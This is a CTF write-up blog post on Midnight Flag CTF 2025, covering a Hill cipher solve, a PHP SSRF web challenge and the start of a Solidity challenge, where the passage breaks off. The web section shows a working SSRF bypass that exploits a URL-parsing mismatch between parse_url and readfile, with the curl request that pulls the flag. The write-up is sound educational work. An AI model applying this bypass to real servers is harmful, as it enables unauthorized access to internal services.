---
title: Midnight Flag CTF 2025 Writeups
url: https://ptr-yudai.hatenablog.com/entry/2025/04/22/145743
source: CTFするぞ
date: 2025-04-23
fetch_date: 2025-10-06T22:05:42.924835
---

# Midnight Flag CTF 2025 Writeups

[![CTFするぞ](https://cdn.image.st-hatena.com/image/square/994ee0e012cf90178bff014bfd99123c02a89b36/backend=imagemagick;height=128;version=1;width=128/https%3A%2F%2Fcdn.user.blog.st-hatena.com%2Fblog_custom_icon%2F153103571%2F1535456424487441)](https://ptr-yudai.hatenablog.com/)

[CTFするぞ](https://ptr-yudai.hatenablog.com/)

[読者になる](https://blog.hatena.ne.jp/ptr-yudai/ptr-yudai.hatenablog.com/subscribe?utm_campaign=subscribe_blog&utm_source=blogs_topright_button&utm_medium=button)

# [CTFするぞ](https://ptr-yudai.hatenablog.com/)

## CTF以外のことも書くよ

[2025-04-22](https://ptr-yudai.hatenablog.com/archive/2025/04/22)

# [Midnight Flag CTF 2025 Writeups](https://ptr-yudai.hatenablog.com/entry/2025/04/22/145743)

[CTF](https://ptr-yudai.hatenablog.com/archive/category/CTF)
[Writeup](https://ptr-yudai.hatenablog.com/archive/category/Writeup)

I participated in the Midnight Flag CTF 2025 qualification round as a member of BunkyoWesterns.
This CTF features an onsite finals event that will be held in France.
We managed to secure 3rd place, so it looks like we’ll be heading to the finals as well.

I mainly focused on the pwnable and web3 challenges.
The pwnables in particular were really well-crafted.
Big thanks to [@MidnightFlag](https://x.com/MidnightFlag) for organizing such a great CTF!

* [Forensics](#Forensics)
  + [Empire sous Frozen (304pt)](#Empire-sous-Frozen-304pt)
* [Crypto](#Crypto)
  + [Highway To Hill (500pt)](#Highway-To-Hill-500pt)
* [Web](#Web)
  + [Disparity (274pt)](#Disparity-274pt)
* [Web3](#Web3)
  + [Alderaan (183pt)](#Alderaan-183pt)
  + [Sublocku (445pt)](#Sublocku-445pt)
  + [DoubleTrouble (498pt)](#DoubleTrouble-498pt)
* [Pwn](#Pwn)
  + [BlindTest (479pt)](#BlindTest-479pt)
  + [NeonPulse (498pt)](#NeonPulse-498pt)
  + [TraumaC (500pt)](#TraumaC-500pt)
  + [Sec Mem (500pt)](#Sec-Mem-500pt)

You can find the challenge files and sources on the [official](https://d.hatena.ne.jp/keyword/official) [GitHub](https://d.hatena.ne.jp/keyword/GitHub) repository:

[github.com](https://github.com/MidnightFlag/qualifiers-challenges-2025)

# Forensics

## [Empire](https://d.hatena.ne.jp/keyword/Empire) sous Frozen (304pt)

I must confess that I dumped the file and challenge description to the AI and got the flag.

![](https://cdn-ak.f.st-hatena.com/images/fotolife/p/ptr-yudai/20250414/20250414234214.png)

# Crypto

## Highway To Hill (500pt)

[Kanon](https://d.hatena.ne.jp/keyword/Kanon) solved the other crypto challenges, but this one remained unsolved during the CTF because it involved a bit of guessing with a classical cipher.

Challenge description:

```
A secret message has been found as well as 3 encryption key.

Hint : Hill, ASCII table 33 to 126
Secret : _!q7-8\!_/})!Z#XcPb'*3m,|>`<;ZB#>+`_CE?E

keyA = [[60,131,101,179,76],[1,134,179,127,115],[28,123,215,204,98],[157,22,28,219,15],[44,27,125,145,223]]
keyB = [[53,17],[5,46]]
keyC = [[89,52,162,39],[91,30,50,30],[222,183,124,41],[2,101,137,191]]
```

After Googling the hint, I came across a classical(?) cipher called the [Hill cipher](https://en.wikipedia.org/wiki/Hill_cipher).
The hint mentioned there were 94 possible characters, but using mod 94 didn’t produce valid results.
I changed the modulus to 93 instead, brute-forced all possible key combinations, and eventually got the flag.

```
F = Zmod(126 - 33) # Not Zmod(126 - 33 + 1)

cipher = "_!q7-8\\!_/})!Z#XcPb'*3m,|>`<;ZB#>+`_CE?E"
print(len(cipher))

keyA = [[60,131,101,179,76],[1,134,179,127,115],[28,123,215,204,98],[157,22,28,219,15],[44,27,125,145,223]]
keyB = [[53,17],[5,46]]
keyC = [[89,52,162,39],[91,30,50,30],[222,183,124,41],[2,101,137,191]]

A = Matrix(F, keyA)^-1
B = Matrix(F, keyB)^-1
C = Matrix(F, keyC)^-1

def decrypt(K, cipher):
    size = K.nrows()
    plain = ""
    for i in range(0, len(cipher), size):
        block = cipher[i:i+size]
        x = vector(F, [ord(c)-33 for c in block])
        y = K * x
        plain += "".join(chr(int(c)+33) for c in y)
    return plain

keys = [A, B, C]
for a, b, c in Permutations([0, 1, 2]):
    neko = cipher
    neko = decrypt(keys[a], neko)
    neko = decrypt(keys[b], neko)
    neko = decrypt(keys[c], neko)
    print(neko)
```

# Web

## Disparity (274pt)

The server was running a [PHP](https://d.hatena.ne.jp/keyword/PHP) script that fetched content from external web servers.

url.[php](https://d.hatena.ne.jp/keyword/php)

```
<?php

ini_set("default_socket_timeout", 5);

if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    die("/url.php is only accessible with POST");
}

if (!isset($_POST['url']) || strlen($_POST['url']) === 0) {
    die("Parameter 'url' is mandatory");
}

$url = $_POST['url'];

try {
    $parsed = parse_url($url);
} catch (Exception $e){
    die("Failed to parse URL");
}
var_dump($parsed);

if (strlen($parsed['host']) === 0){
    die("Host can not be empty");
}

if ($parsed['scheme'] !== "http"){
    die("HTTP is the only option");
}

// Prevent DNS rebinding
try {
    $ip = gethostbyname($parsed['host']);
} catch(Exception $e) {
    die("Failed to resolve IP");
}

// Prevent from fetching localhost
if (preg_match("/^127\..*/",$ip) || $ip === "0.0.0.0"){
    die("Can't fetch localhost");
}

echo 'str_replace("'.$parsed['host'].'", "'.$ip.'", "'.$url.'")'."\n";
$url =  str_replace($parsed['host'],$ip,$url);
var_dump($url);

// Fetch url
try {
    ob_start();
    $len_content = readfile($url);
    $content = ob_get_clean();
} catch (Exception $e) {
    die("Failed to request URL");
}

if ($len_content > 0) {
    echo $content;
} else {
    die("Empty reply from server");
}

?>
```

The flag was stored on another local server that wasn’t directly accessible to the players.

flag.[php](https://d.hatena.ne.jp/keyword/php)

```
<?php

if ($_SERVER['HTTP_HOST'] === "localhost:8080"){
    echo getenv('FLAG');
} else {
    echo "You are not allowed to do that";
}
?>
```

The IP check could be bypassed by using notations like 0x7f000001, which are interpreted as [127.0.0.1](https://d.hatena.ne.jp/keyword/127.0.0.1). However, the challenge was that `flag.php` had a check on the `HTTP_HOST` header, and the hostname couldn’t be something like `localhost:8080` when using these kinds of IP notations.

Initially, I thought about abusing `str_replace` to modify the HTTP [scheme](https://d.hatena.ne.jp/keyword/scheme) and perform an LFI. However, I found that `gethostbyname` returns the original string if it fails to resolve the address.

While experimenting with `parse_url` and `readfile` on my local machine, I discovered an interesting behavior when parsing malformed [IPv6](https://d.hatena.ne.jp/keyword/IPv6)-like strings such as `fe00::`, which should normally resolve to [localhost](https://d.hatena.ne.jp/keyword/localhost).

Here’s the example:

```
http://xxx::/flag.php
```

When passed to `parse_url`, the host is interpreted as `xxx:`, but `readfile` tries to resolve `xxx` and fails:

Test script:

```
<?php
$url = "http://xxx::/flag.php";
var_dump(parse_url($url));
readfile($url);
```

Result:

```
array(3) {
  'scheme' =>
  string(4) "http"
  'host' =>
  string(4) "xxx:"
  'path' =>
  string(9) "/flag.php"
}
PHP Warning:  readfile(): php_network_getaddresses: getaddrinfo for xxx failed: Temporary failure in name resolution ...
...
```

Apparently, when a URL contains two colons in the host field, `parse_url` and `readfile` interpret it differently.
By leveraging this inconsistency, I was able to bypass the host checks and perform an SSRF to retrieve the flag.

```
$ curl -X POST http://chall4.midnightflag.fr:13990/url.php --data "url=http://localhost:8080:/flag.php"
MCTF{a1104b51a44ecb61585cafacd59f77c1}
```

# Web3

## Alderaan (183pt)

This was a very simple web3 challenge.

```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

contract Alderaan {
    event AlderaanDestroyed(address indexed destroyer, uint256 amount);
    bool public isSolved = false;

    constructor() payable{
        require(msg.value > 0,"Contract require some ETH !");
    }

    function DestroyAlderaa...